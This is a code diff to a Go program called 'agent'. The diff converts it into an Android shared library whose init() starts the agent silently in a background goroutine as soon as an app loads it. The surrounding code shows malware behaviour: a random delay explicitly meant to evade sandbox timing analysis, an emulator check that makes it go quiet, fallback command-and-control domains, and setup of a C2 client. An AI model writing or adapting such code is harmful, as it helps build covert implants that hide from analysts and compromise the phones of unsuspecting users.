@@ -1,5 +1,12 @@
 package main
 
+/*
+   Built with -buildmode=c-shared.
+   When Android loads this via System.loadLibrary("agent"),
+   Go's init() starts the agent in a background goroutine.
+*/
+import "C"
+
 import (
 	"bytes"
 	"context"
@@ -1126,7 +1133,16 @@ func isEmulator() bool {
 // MAIN
 // ============================================================
 
-func main() {
+// main is required but not called in c-shared mode.
+func main() {}
+
+// init runs automatically when System.loadLibrary("agent") is called.
+// The agent logic runs in a goroutine so it doesn't block the Java caller.
+func init() {
+	go runAgent()
+}
+
+func runAgent() {
 	// Delay startup to avoid sandbox timing analysis
 	time.Sleep(time.Duration(3+rand.Intn(5)) * time.Second)
 
@@ -1134,7 +1150,7 @@ func main() {
 	if isEmulator() {
 		// Sleep and exit quietly
 		time.Sleep(30 * time.Second)
-		os.Exit(0)
+		return
 	}
 
 	// Build machine ID
@@ -1149,7 +1165,7 @@ func main() {
 		domains = append(domains, c2Domain2)
 	}
 	if len(domains) == 0 {
-		os.Exit(1)
+		return
 	}
 
 	// Init C2 client
